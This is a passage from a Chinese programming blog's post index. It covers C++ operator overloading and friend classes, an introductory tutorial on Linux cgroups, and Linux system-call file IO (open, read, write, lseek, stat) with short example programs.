递增运算符重载作用：通过重载递增运算符，实现自己的整型数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//重载递增运算符//自定义整型class MyInteger&#123; friend ostream&amp; operator&lt;&lt;(ostream&amp; cout, MyInteger myint);public: MyInteger() &#123; m_Num = 0; &#125; //重载前置++运算符 返回引用是为了一直对一个数据操作 MyInteger&amp; operator++() &#123; //先做++运算 m_Num++; //再返回自身 return *this; &#125; //重载后置++运算符 int代表占位参数，可以用于区分前置和后置递增 MyInteger operator++(int) &#123; //先记录结果 MyInteger temp = *this; //后递增 m_Num++; //返回记录的结果 return temp; &#125;private: int m_Num;&#125;;ostream&amp; operator&lt;&lt;(ostream&amp; cout, MyInteger myint)&#123; cout &lt;&lt; myint.m_Num; return cout;&#125;void test01()&#123; MyInteger myint; cout &lt;&lt; ++myint &lt;&lt; endl;&#125;void test02()&#123; MyInteger myint; cout &lt;&lt; myint++ &lt;&lt; endl;&#125;int main()&#123; test01(); test02();&#125; 运行结果为： 1 0 赋值运算符重载C++编译器至少给一个类添加四个函数 1、默认构造函数（无参，函数体为空） 2、默认析构函数（无参，函数体为空） 3、默认拷贝构造函数，对属性进行值拷贝 4、赋值运算符operator&#x3D;对属性进行值拷贝 如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//赋值运算符重载class Person&#123;public: Person(int age) &#123; m_Age = new int(age); &#125; int* m_Age; ~Person() &#123; if (m_Age != NULL) &#123; delete m_Age; m_Age = NULL; &#125; &#125; Person&amp; operator=(Person&amp; p) &#123; //编译器提供浅拷贝 //应该先判断是否有属性在堆区，如果有，先释放干净，然后再深拷贝 if (m_Age != NULL) &#123; delete m_Age; m_Age = NULL; &#125; //深拷贝 m_Age = new int(*p.m_Age); //返回对象本身 return *this; &#125;&#125;;void test01()&#123; Person p1(18); Person p2(20); Person p3(30); p3 = p2 = p1; cout &lt;&lt; &quot;p1的年龄为： &quot; &lt;&lt; *p1.m_Age &lt;&lt; endl; cout &lt;&lt; &quot;p2的年龄为： &quot; &lt;&lt; *p2.m_Age &lt;&lt; endl; cout &lt;&lt; &quot;p3的年龄为： &quot; &lt;&lt; *p3.m_Age &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： p1的年龄为： 18p2的年龄为： 18p3的年龄为： 18 关系运算符重载作用：重载关系运算符，可以让两个自定义类型对象进行对比操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//重载关系运算符class Person&#123;public: Person(string name, int age) &#123; m_Name = name; m_Age = age; &#125; string m_Name; int m_Age; bool operator==(Person&amp; p) &#123; if (this-&gt;m_Name == p.m_Name &amp;&amp; this-&gt;m_Age == p.m_Age) &#123; return true; &#125; return false; &#125; bool operator!=(Person&amp; p) &#123; if (this-&gt;m_Name == p.m_Name &amp;&amp; this-&gt;m_Age == p.m_Age) &#123; return false; &#125; return true; &#125;&#125;;void test01()&#123; Person p1(&quot;Tom&quot;, 18); Person p2(&quot;Tom&quot;, 18); if (p1 == p2) &#123; cout &lt;&lt; &quot;p1和p2是相等的&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;p1和p2是不相等的&quot; &lt;&lt; endl; &#125; if (p1 != p2) &#123; cout &lt;&lt; &quot;p1和p2是不相等的&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;p1和p2是相等的&quot; &lt;&lt; endl; &#125;&#125;int main()&#123; test01();&#125; 运行结果为： p1和p2是相等的p1和p2是相等的 函数调用运算符重载函数调用运算符（）也可以重载 由于重载后使用的方式非常像函数的调用，因此称为仿函数 仿函数没有固定写法，非常灵活 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//函数调用运算符重载class MyPrint&#123;public: //重载函数调用运算符 void operator()(string test) &#123; cout &lt;&lt; test &lt;&lt; endl; &#125;&#125;;void test01()&#123; MyPrint myPrint; myPrint(&quot;hello world&quot;);&#125;//仿函数非常灵活，没有固定的写法//加法类class MyAdd&#123;public: int operator()(int num1, int num2) &#123; return num1 + num2; &#125;&#125;;void test02()&#123; MyAdd myadd; int ret = myadd(100, 100); cout &lt;&lt; &quot;ret = &quot; &lt;&lt; ret &lt;&lt; endl; //匿名函数对象 cout &lt;&lt; MyAdd()(100, 100) &lt;&lt; endl;&#125;int main()&#123; test01(); test02();&#125; 运行结果为： hello worldret &#x3D; 200200","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 友元","slug":"C++-学习-友元","date":"2023-04-29T10:03:06.000Z","updated":"2023-05-09T08:11:48.455Z","comments":true,"path":"2023/04/29/C++-学习-友元/","link":"","permalink":"http://example.com/2023/04/29/C++-%E5%AD%A6%E4%B9%A0-%E5%8F%8B%E5%85%83/","excerpt":"生活中你的家有客厅（public），有你的卧室（private） 客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去 但是呢，你也可以允许你的好闺蜜基友进去","text":"生活中你的家有客厅（public），有你的卧室（private） 客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去 但是呢，你也可以允许你的好闺蜜基友进去 在程序里，有些私有属性也想让类外特殊的一些函数或者类进行访问，就需要用到友元的技术 友元的目的就是让一个函数或者类访问另一个类中的私有成员 友元的关键字为friend 友元的三种实现 全局函数做友元 类做友元 成员函数做友元 全局函数做友元123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//建筑物类class Building&#123; //goodGuy全局函数是Building的好朋友，可以访问Building中私有成员 friend void goodGuy(Building* building);public: Building() &#123; m_SittingRoom = &quot;客厅&quot;; m_BedRoom = &quot;卧室&quot;; &#125;public: string m_SittingRoom;//客厅private: string m_BedRoom;//卧室&#125;;//全局函数void goodGuy(Building *building)&#123; cout &lt;&lt; &quot;好基友的全局函数 正在访问：&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl; cout &lt;&lt; &quot;好基友的全局函数 正在访问：&quot; &lt;&lt; building-&gt;m_BedRoom&lt;&lt; endl;&#125;void test01()&#123; Building building; goodGuy(&amp;building);&#125;int main()&#123; test01();&#125; 运行结果为： 好基友的全局函数 正在访问：客厅好基友的全局函数 正在访问：卧室 类做友元123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//建筑物类class Building;class GoodGuy&#123;public: GoodGuy(); void visit();//参观函数 访问Building中的属性 Building* building;&#125;;class Building&#123; //GoodGuy类是本类的好朋友，可以访问本类中的私有成员 friend class GoodGuy;public: Building();public: string m_SittingRoom;//客厅private: string m_BedRoom;//卧室&#125;;//类外写成员函数Building::Building()&#123; m_SittingRoom = &quot;客厅&quot;; m_BedRoom = &quot;卧室&quot;;&#125;GoodGuy::GoodGuy()&#123; //创建建筑物对象 building = new Building;&#125;void GoodGuy::visit()&#123; cout &lt;&lt; &quot;好基友类正在访问：&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl; cout &lt;&lt; &quot;好基友类正在访问：&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;&#125;void test01()&#123; GoodGuy gg; gg.visit();&#125;int main()&#123; test01();&#125; 运行结果为： 好基友类正在访问：客厅好基友类正在访问：卧室 成员函数做友元12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class Building;class GoodGuy&#123;public: GoodGuy(); void visit();//让visit函数可以访问Building中的私有成员 void visit2();//让visit2函数不可以访问Building中私有成员 Building* building;&#125;;class Building&#123; //告诉编译器 GoodGuy类下的visit成员函数 friend void GoodGuy::visit();public: Building();public: string m_SittingRoom;//客厅private: string m_BedRoom;//卧室&#125;;Building::Building()&#123; m_SittingRoom = &quot;客厅&quot;; m_BedRoom = &quot;卧室&quot;;&#125;GoodGuy::GoodGuy()&#123; building = new Building;&#125;void GoodGuy::visit()&#123; cout &lt;&lt; &quot;visit函数正在访问：&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl; cout &lt;&lt; &quot;visit函数正在访问：&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;&#125;void GoodGuy::visit2()&#123; cout &lt;&lt; &quot;visit2函数正在访问：&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl; //cout &lt;&lt; &quot;visit函数正在访问：&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;访问不了&#125;void test01()&#123; GoodGuy gg; gg.visit(); gg.visit2();&#125;int main()&#123; test01();&#125; 运行结果为： visit函数正在访问：客厅visit函数正在访问：卧室visit2函数正在访问：客厅","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"学习 Linux Cgroup 入门","slug":"学习-Linux-Cgroup入门","date":"2023-04-26T11:46:46.000Z","updated":"2024-01-10T02:20:57.705Z","comments":true,"path":"2023/04/26/学习-Linux-Cgroup入门/","link":"","permalink":"http://example.com/2023/04/26/%E5%AD%A6%E4%B9%A0-Linux-Cgroup%E5%85%A5%E9%97%A8/","excerpt":"cgroup（控制组）是 Linux 内核中的一个特性，用于限制、隔离和管理进程和系统资源的使用。它是一个层次化的组织结构，允许对进程进行分组，并为这些组分配系统资源，如 CPU、内存、磁盘 I&#x2F;O 和网络带宽。cgroup 主要用于操作系统的资源管理和容器技术，如 Docker 和 Kubernetes 等。 cgroup 的特点和功能包括： 资源限制：您可以为每个 cgroup 分配特定的系统资源，如 CPU 使用率、内存限制等。这有助于防止某个进程或组消耗过多资源，影响其他进程的运行。 资源隔离：cgroup 可以将不同组的进程隔离，这样它们不会互相影响。例如，在一个容器中运行的进程可以被限制在其所分配的资源范围内，不会影响到其他容器或系统进程。 资源监控：通过 cgroup，您可以监控每个组的资源使用情况，从而更好地了解系统的运行状态。这有助于发现性能瓶颈、优化资源分配等。 优先级控制：cgroup 允许您为进程组分配不同的优先级，以确保关键任务始终优先获得资源。","text":"cgroup（控制组）是 Linux 内核中的一个特性，用于限制、隔离和管理进程和系统资源的使用。它是一个层次化的组织结构，允许对进程进行分组，并为这些组分配系统资源，如 CPU、内存、磁盘 I&#x2F;O 和网络带宽。cgroup 主要用于操作系统的资源管理和容器技术，如 Docker 和 Kubernetes 等。 cgroup 的特点和功能包括： 资源限制：您可以为每个 cgroup 分配特定的系统资源，如 CPU 使用率、内存限制等。这有助于防止某个进程或组消耗过多资源，影响其他进程的运行。 资源隔离：cgroup 可以将不同组的进程隔离，这样它们不会互相影响。例如，在一个容器中运行的进程可以被限制在其所分配的资源范围内，不会影响到其他容器或系统进程。 资源监控：通过 cgroup，您可以监控每个组的资源使用情况，从而更好地了解系统的运行状态。这有助于发现性能瓶颈、优化资源分配等。 优先级控制：cgroup 允许您为进程组分配不同的优先级，以确保关键任务始终优先获得资源。 cgroup 分 v1 和 v2 两个版本，v1 实现较早，功能比较多，但是由于它里面的功能都是零零散散的实现的，所以规划的不是很好，导致了一些使用和维护上的不便，v2 的出现就是为了解决 v1 中这方面的问题，在 4.5 内核中，cgroup v2 声称已经可以用于生产环境了，但它所支持的功能还很有限，随着 v2 一起引入内核的还有 cgroup namespace。v1 和 v2 可以混合使用，但是这样会更复杂，所以一般没人会这样用。 为什么需要cgroup在 Linux 里，一直以来就有对进程进行分组的概念和需求，比如 session group， progress group 等，后来随着人们对这方面的需求越来越多，比如需要追踪一组进程的内存和 IO 使用情况等，于是出现了 cgroup，用来统一将进程进行分组，并在分组的基础上对进程进行监控和资源控制管理等。 什么是cgroup术语 cgroup 在不同的上下文中代表不同的意思，可以指整个 Linux 的 cgroup 技术，也可以指一个具体进程组。 cgroup 是 Linux 下的一种将进程按组进行管理的机制，在用户层看来，cgroup 技术就是把系统中的所有进程组织成一颗一颗独立的树，每棵树都包含系统的所有进程，树的每个节点是一个进程组，而每颗树又和一个或者多个 subsystem 关联，树的作用是将进程分组，而 subsystem 的作用就是对这些组进行操作。cgroup 主要包括下面两部分： subsystem : 一个 subsystem 就是一个内核模块，他被关联到一颗 cgroup 树之后，就会在树的每个节点（进程组）上做具体的操作。subsystem 经常被称作 resource controller，因为它主要被用来调度或者限制每个进程组的资源，但是这个说法不完全准确，因为有时我们将进程分组只是为了做一些监控，观察一下他们的状态，比如 perf_event subsystem。到目前为止，Linux 支持 12 种 subsystem，比如限制 CPU 的使用时间，限制使用的内存，统计 CPU 的使用情况，冻结和恢复一组进程等 hierarchy : 一个 hierarchy 可以理解为一棵 cgroup 树，树的每个节点就是一个进程组，每棵树都会与零到多个 subsystem 关联。在一颗树里面，会包含 Linux 系统中的所有进程，但每个进程只能属于一个节点（进程组）。系统中可以有很多颗 cgroup 树，每棵树都和不同的 subsystem 关联，一个进程可以属于多颗树，即一个进程可以属于多个进程组，只是这些进程组和不同的 subsystem 关联。目前 Linux 支持 12 种 subsystem，如果不考虑不与任何 subsystem 关联的情况（systemd 就属于这种情况），Linux 里面最多可以建 12 颗 cgroup 树，每棵树关联一个 subsystem，当然也可以只建一棵树，然后让这棵树关联所有的 subsystem。当一颗 cgroup 树不和任何 subsystem 关联的时候，意味着这棵树只是将进程进行分组，至于要在分组的基础上做些什么，将由应用程序自己决定，systemd 就是一个这样的例子。 查看当前系统支持哪些subsystem可以通过查看&#x2F;proc&#x2F;cgroups（Linux v5.19.0-38-generic），知道当前系统支持哪些subsystem 123456789101112131415#subsys_name hierarchy num_cgroups enabledcpuset 0 149 1cpu 0 149 1cpuacct 0 149 1blkio 0 149 1memory 0 149 1devices 0 149 1freezer 0 149 1net_cls 0 149 1perf_event 0 149 1net_prio 0 149 1hugetlb 0 149 1pids 0 149 1rdma 0 149 1misc 0 149 1 从左到右，字段的含义分别是： subsystem的名字 subsystem所关联到的cgroup树的ID，如果多个subsystem关联到同一颗cgroup树，那么他们的这个字段将一样，比如这里的cpu和cpuacct就一样，表示他们绑定到了同一颗树。如果出现下面的情况，这个字段将为0： 当前subsystem没有和任何cgroup树绑定 当前subsystem已经和cgroup v2的树绑定 当前subsystem没有被内核开启 subsystem所关联的cgroup树中进程组的个数，也即树上节点的个数 1表示开启，0表示没有被开启(可以通过设置内核的启动参数“cgroup_disable”来控制subsystem的开启). systemdsystemd 是一个 Linux 系统和服务管理器，它成为许多主流 Linux 发行版（如 Debian、Ubuntu、Fedora、RHEL 和 CentOS 等）的默认初始化系统（init system）。systemd 负责在系统启动时引导和管理后台进程（称为服务或守护进程），并在运行过程中对这些服务进行监控和管理。 systemd 的主要特点和优点包括： 并行启动服务：systemd 能够并行启动服务，从而加快系统启动速度。 按需启动服务：systemd 支持 socket 激活和 D-Bus 激活，可以根据需要按需启动服务。 服务管理和监控：systemd 提供了在运行时管理和监控服务的功能，如自动重启失败的服务、记录服务状态和日志等。 系统管理功能：除了管理服务，systemd 还提供了一些系统管理功能，如控制电源、管理用户会话和设备等。 systemd 使用名为 unit 的配置文件来管理服务和资源。这些配置文件定义了服务的启动顺序、依赖关系、运行参数等信息。Unit 可以是以下类型之一： 服务（Service）：后台进程（守护进程）。 套接字（Socket）：IPC 和网络套接字，用于按需启动服务。 设备（Device）：设备节点。 挂载点（Mount）：文件系统挂载点。 自动挂载点（Automount）：自动挂载文件系统。 目标（Target）：用于组织其他 Unit 的逻辑分组。 路径（Path）：文件系统路径，用于监视文件系统事件。 时间器（Timer）：定时器，用于定时启动其他 Unit。 快照（Snapshot）：保存当前系统状态的快照。 切片（Slice）：用于组织和管理系统资源的层次结构。 systemd 提供了一些命令行工具，如 systemctl、journalctl 等，用于管理和查询系统和服务状态。例如，你可以使用 systemctl start、systemctl stop、systemctl restart 等命令来控制服务。 所有的subsystems目前Linux支持下面12种subsystem cpu (since Linux 2.6.24; CONFIG_CGROUP_SCHED)用来限制cgroup的CPU使用率。 cpuacct (since Linux 2.6.24; CONFIG_CGROUP_CPUACCT)统计cgroup的CPU的使用率。 cpuset (since Linux 2.6.24; CONFIG_CPUSETS)绑定cgroup到指定CPUs和NUMA节点。 memory (since Linux 2.6.25; CONFIG_MEMCG)统计和限制cgroup的内存的使用率，包括process memory, kernel memory, 和swap。 devices (since Linux 2.6.26; CONFIG_CGROUP_DEVICE)限制cgroup创建(mknod)和访问设备的权限。 freezer (since Linux 2.6.28; CONFIG_CGROUP_FREEZER)suspend和restore一个cgroup中的所有进程。 net_cls (since Linux 2.6.29; CONFIG_CGROUP_NET_CLASSID)将一个cgroup中进程创建的所有网络包加上一个classid标记，用于tc和iptables。 只对发出去的网络包生效，对收到的网络包不起作用。 blkio (since Linux 2.6.33; CONFIG_BLK_CGROUP)限制cgroup访问块设备的IO速度。 perf_event (since Linux 2.6.39; CONFIG_CGROUP_PERF)对cgroup进行性能监控 net_prio (since Linux 3.3; CONFIG_CGROUP_NET_PRIO)针对每个网络接口设置cgroup的访问优先级。 hugetlb (since Linux 3.5; CONFIG_CGROUP_HUGETLB)限制cgroup的huge pages的使用量。 pids (since Linux 4.3; CONFIG_CGROUP_PIDS)限制一个cgroup及其子孙cgroup中的总进程数。 上面这些subsystem，有些需要做资源统计，有些需要做资源控制，有些即不统计也不控制。对于cgroup树来说，有些subsystem严重依赖继承关系，有些subsystem完全用不到继承关系，而有些对继承关系没有严格要求。 不同subsystem的工作方式可能差别较大，对系统性能的影响也不一样，本人不是这方面的专家，后续文章中只会从功能的角度来介绍不同的subsystem，不会涉及到他们内部的实现。 如何使用cgroupcgroup相关的所有操作都是基于内核中的cgroup virtual filesystem，使用cgroup很简单，挂载这个文件系统就可以了。一般情况下都是挂载到&#x2F;sys&#x2F;fs&#x2F;cgroup目录下，当然挂载到其它任何目录都没关系。 这里假设目录&#x2F;sys&#x2F;fs&#x2F;cgroup已经存在，下面用到的xxx为任意字符串，取一个有意义的名字就可以了，当用mount命令查看的时候，xxx会显示在第一列。 挂载一颗和所有subsystem关联的cgroup树到&#x2F;sys&#x2F;fs&#x2F;cgroup 1mount -t cgroup xxx /sys/fs/cgroup 挂载一颗和cpuset subsystem关联的cgroup树到&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpuset 12mkdir /sys/fs/cgroup/cpusetmount -t cgroup -o cpuset 挂载一颗与cpu和cpuacct subsystem关联的cgroup树到&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu,cpuacct 12mkdir /sys/fs/cgroup/cpu,cpuacctmount -t cgroup -o cpu,cpuacct xxx /sys/fs/cgroup/cpu,cpuacct 挂载一棵cgroup树，但不关联任何subsystem，下面就是systemd所用到的方式 12mkdir /sys/fs/cgroup/systemdmount -t cgroup -o none,name=systemd xxx /sys/fs/cgroup/systemd 删除一个挂载 1sudo umount .... 在很多使用systemd的系统中，比如ubuntu 16.04，systemd已经帮我们将各个subsystem和cgroup树关联并挂载好了 运行命令查看： 1mount|grep cgroup 使用cgroup限制一个进程的CPU使用率(cgroup v2)首先安装cgroup工具 1sudo apt-get install cgroup-tools 确认系统正在使用cgroup v2 1cat /proc/self/cgroup 如果输出的第一行以0::开头，那么您的系统正在使用cgroup v2。 现在，我们将创建一个名为my_cgroup的cgroup，并限制其CPU使用率为50%。首先创建一个cgroup目录： 1sudo mkdir /sys/fs/cgroup/my_cgroup 接下来，为这个cgroup设置CPU权重。cgroup v2使用权重值来调整CPU使用率，范围是1-10000。默认值为100。要将CPU使用率限制为50%，我们将权重设置为50： 1echo 50 | sudo tee /sys/fs/cgroup/my_cgroup/cpu.weight 现在，我们将一个进程添加到my_cgroup。例如，假设我们有一个名为my_process的进程，其进程ID为xxxxx。要将此进程添加到my_cgroup，请执行以下命令： 1echo xxxxx | sudo tee -a /sys/fs/cgroup/my_cgroup/cgroup.procs 现在，my_process进程的CPU使用率将受到my_cgroup中的限制。 要查看cgroup的信息，可以运行以下命令： 12cat /proc/xxxxx/cgroupcat /sys/fs/cgroup/my_cgroup/cpu.weight 要删除一个cgroup，请使用以下命令： 1sudo rmdir /sys/fs/cgroup/my_cgroup 在删除cgroup目录之前，需要将所有进程移出这个cgroup。 查找属于cgroup的进程。通常，进程ID存储在cgroup.procs文件中。 1cat /sys/fs/cgroup/my_cgroup/cgroup.procs 将进程移出cgroup。或者将进程移到其他cgroup 1echo xxxxx | sudo tee /sys/fs/cgroup/cgroup.procs 确认my_cgroup中不再有进程。再次查看cgroup.procs文件，确保其中没有进程ID： 1cat /sys/fs/cgroup/my_cgroup/cgroup.procs 再次删除cgroup 1sudo rmdir /sys/fs/cgroup/my_cgroup 参考资料Linux Cgroup 入门教程：基本概念 – 云原生实验室 - Kubernetes|Docker|Istio|Envoy|Hugo|Golang|云原生 (icloudnative.io) Linux Cgroup系列（01）：Cgroup概述 - Linux程序员 - SegmentFault 思否","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"Cgroup","slug":"Linux内核/Cgroup","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/Cgroup/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"Cgroup","slug":"Cgroup","permalink":"http://example.com/tags/Cgroup/"}]},{"title":"C++ 学习 Linux系统编程 文件IO","slug":"C++-学习-Linux系统编程-文件IO","date":"2023-04-26T08:01:56.000Z","updated":"2023-05-14T07:19:51.804Z","comments":true,"path":"2023/04/26/C++-学习-Linux系统编程-文件IO/","link":"","permalink":"http://example.com/2023/04/26/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E6%96%87%E4%BB%B6IO/","excerpt":"标准C库IO函数和Linux系统IO函数对比标准C库IO函数","text":"标准C库IO函数和Linux系统IO函数对比标准C库IO函数 标准C库IO函数是跨平台的，第三方库 标准C库函数和Linux系统函数是调用和被调用的关系 Linux函数更加低级更底层一些，效率更高 C函数更高级一些 标准C库IO函数和Linux系统IO的关系 虚拟地址空间 文件描述符 open函数命令man可以查看详细信息 12man 2 (Linux系统IO函数)man 3 (C标准库函数) 具体命令如下： 12345678910111213141516171819#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;//1、第一个open函数：打开一个已经存在的文件int open(const char* pathname, int flags);//不是函数重载，是通过可变参数实现这种效果//参数：//-pathname：要打开的文件路径//- flags：对文件操作权限设置还有其他设置(O_RDONLY,O_WRONLY,O_RDWR这三个设置是互斥的)//返回值：返回一个新的文件描述符，如果调用失败返回-1//errno：属于Linux系统函数库，库里面的一个全局变量，记录的是最近的错误号void perror(const char* s);//参数s：用户描述，比如hello，最终输出的内容是 hello：xxx// 作用：打印erroro对应的错误描述//2、第二个open函数：创建一个新的文件int open(const char* pathname, int flags, mode_t mode); 举例： 1234567891011121314151617#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;int main()&#123; int fd = open(&quot;a.txt&quot;, O_RDONLY); if (fd == -1) &#123; perror(&quot;open&quot;); &#125; //关闭 close(fd); return 0;&#125; 运行结果为： open创建新文件12345678910int open(const char *pathname,int flags,mode_t mode);//参数：//- pathname：要创建文件的路径//- flags：对文件的操作权限和其他的设置// 必选项： O_RDONLY,O_WRONLY,O_RDWR这三个之间是互斥的// 可选项：O_CREAT 文件不存在创建新文件//- mode：八进制的数，表示创建出的新的文件的操作权限，比如：0775// 最终的权限是：mode &amp; ~umask（umask的作用是抹去某些权限）// flags参数是一个int类型的数据，占四个字节，32位// flags 32位，每一位就是一个标志位 12345678910111213141516#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;int main()&#123; //创建一个新的文件 int fd = open(&quot;create.txt&quot;, O_RDWR | O_CREAT, 0777); if (fd == -1) &#123; perror(&quot;open&quot;); &#125; //关闭文件描述符 close(fd);&#125; 编译运行这段代码之后，我们的文件夹中会创建一个create.txt文件 read、write函数12345678910111213141516171819#include&lt;unistd.h&gt;ssize_t read(int fd,void *buf,size_t count);//参数：//-fd：文件描述符，open得到的，通过这个文件描述符操作某个文件//- buf：需要读取数据存放的地方，数组的地址（传出参数）//- count：指定的数组的大小//返回值//- 成功：// - 大于0：返回实际读取到的字节数// - 等于0：文件已经读取完了//- 失败：-1，并且设置errnossize_t write(int fd,const void *buf,size_t count)//参数//- fd：文件描述符，open得到的，通过这个文件描述符操作某个文件//- buf：要往磁盘//- count：要写入的数据的实际的大小//返回值//- 成功：实际写入的字节数//- 失败：返回-1，并写入errno 例子，copyfile.c函数我们运行如下函数，将english.txt复制一份 123456789101112131415161718192021222324252627282930313233343536#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;stdio.h&gt;int main()&#123; //1.通过open打开english.txt文件 int srcfd = open(&quot;english.txt&quot;, O_RDONLY); if (srcfd == -1) &#123; perror(&quot;open&quot;); return -1; &#125; //2.创建一个新的文件（拷贝文件） int destfd = open(&quot;cpy.txt&quot;, O_WRONLY | O_CREAT, 0664); if (destfd == -1) &#123; perror(&quot;open&quot;); return -1; &#125; //3.频繁的读写操作 char buf[1024] = &#123; 0 &#125;; int len = 0; while ((len = read(srcfd, buf, sizeof(buf))) &gt; 0) &#123; write(destfd, buf, len); &#125; len = read(srcfd, buf, sizeof(buf)); //4.关闭文件 close(destfd); close(srcfd);&#125; lseek函数1234567891011121314151617181920//标准C库函数#include&lt;stdio.h&gt;int fseek(FILE* stream, long offset, int whence);//Linux系统函数#include&lt;sys/types.h&gt;#include&lt;unistd.h&gt;off_t lseek(int fd, off_t offset, int whence);//参数//- fd：文件描述符，通过open得到的，通过这个fd操作某个文件//- offset：偏移量//- whence：// SEEK_SET:设置文件指针的偏移量// SEEK_CUR:设置偏移量，从当前位置加上当前参数offset的值// SEEK_END:设置偏移量，文件的大小加第二个参数offset的值//返回值：返回文件指针所在的位置//作用：//1、移动文件指针到文件头 lseek(fd,0,SEEK_SET);//2、获取当前文件指针的位置 lseek(fd,0,SEEK_CUR);//3、获取文件长度 lseek(fd,0,SEEK_END);//4、拓展文件长度，当前文件10b，拓展到110b lseek(fd,100,SEEK_END); 需要写一次数据 例子：拓展hello.txt的文件长度12345678910111213141516171819202122232425#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;unistd.h&gt;int main()&#123; int fd = open(&quot;hello.txt&quot;, O_RDWR); if (fd == -1) &#123; perror(&quot;open&quot;); return -1; &#125; //扩展文件的长度 int ret = lseek(fd, 100, SEEK_END); if (ret == -1) &#123; perror(&quot;lseek&quot;); return -1; &#125; //写入空数据 write(fd, &quot; &quot;, 1); //关闭文件 close(fd);&#125; 运行结果为： stat、lstat函数stat结构体123456789101112131415struct stat&#123; dev_t st_dev;//文件的设备编号 ino_t st_ino;//节点 mode_t st_mode;//文件的类型和存取的权限 nlink_t st_nlink;//连接该文件的硬链接数目 uid_t st_uid;//用户ID gid_t st_gid;//组ID dev_t st_rev;//设备文件的设备编号 off_t st_size;//文件字节数，文件大小 blksize_t st_blksize;//块大小 blkcnt_t t_blocks;//块数 time_t st_atime;//最后一次访问时间 time_t st_mtime;//最后一次修改时间 time_t st_ctime;//最后一次改变事件，属性&#125; st_mode stat函数123456789101112#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;unistd.h&gt;int stat(const char* pathname, struct stat* statbuf);//作用：获取一个文件相关的信息//参数：//- pathname：操作文件的路径//- statbuf：结构体变量，传出参数，用于保存获取到的文件信息//返回值//- 成功：返回0//- 失败：返回-1，设置errnoint lstat(const char* pathname, struct stat* statbuf);//获取软连接信息 例子：获取文件a.txt的长度12345678910111213141516#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;int main()&#123; struct stat statbuf; int ret = stat(&quot;a.txt&quot;, &amp;statbuf); if (ret == -1) &#123; perror(&quot;stat&quot;); return -1; &#125; printf(&quot;size: %ld\\n&quot;, statbuf.st_size);&#125; 运行结果为： 模拟实现ls-l命令ls -l会列出当前文件的信息 我们实现一个ls-l.c模拟实现ls -l命令 